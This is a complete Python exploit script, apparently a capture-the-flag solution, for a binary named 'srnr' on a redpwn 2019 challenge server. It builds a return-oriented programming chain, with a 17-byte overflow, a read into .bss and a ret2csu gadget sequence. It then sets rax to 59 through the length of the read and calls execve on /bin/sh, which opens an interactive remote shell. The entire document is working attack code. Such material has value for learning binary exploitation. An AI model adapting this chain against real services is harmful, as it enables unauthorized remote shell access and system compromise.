from ptrlib import *
import time

elf = ELF("./srnr")
#sock = Process("./srnr")
sock = Socket("chall2.2019.redpwn.net", 4008)

plt_read = 0x4005d0
addr_csu_pop  = 0x40081a
addr_csu_init = 0x400800
addr_syscall = 0x400703
rop_pop_rdi = 0x00400823
rop_pop_rsi_r15 = 0x00400821
var = elf.section(".bss") + 0x100

sock.sendlineafter("bytes: ", "0")

payload = b"A" * 17
payload += p64(rop_pop_rdi)
payload += p64(0)
payload += p64(rop_pop_rsi_r15)
payload += p64(var)
payload += p64(0xdeadbeef)
payload += p64(plt_read)

payload += p64(addr_csu_pop)
payload += p64(0)       # rbx: 0
payload += p64(1)       # rbp: 1
payload += p64(var)     # r12-->func
payload += p64(var + 8) # r13-->edi
payload += p64(0)       # r14-->rsi
payload += p64(0)       # r15-->rdx
payload += p64(addr_csu_init)
sock.send(payload)
time.sleep(1)
payload = p64(addr_syscall) + b"/bin/sh\x00"
payload += b"A" * (59 - len(payload)) # execve
sock.send(payload)

sock.interactive()
